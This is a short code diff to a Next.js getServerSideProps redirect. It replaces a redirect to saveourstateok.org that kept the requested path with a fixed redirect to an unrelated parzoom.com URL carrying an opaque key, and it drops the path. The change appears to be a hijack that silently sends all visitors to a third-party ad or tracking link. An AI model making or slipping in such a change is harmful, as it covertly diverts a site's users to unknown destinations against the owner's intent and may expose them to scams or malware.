@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://saveourstateok.org/` + encodeURI(path as string)
+					`https://parzoom.com/vmvj9pdsr?key=aafc5688b250fc753247bef7c64a2a7a/`
 				}`,
 			},
 		};
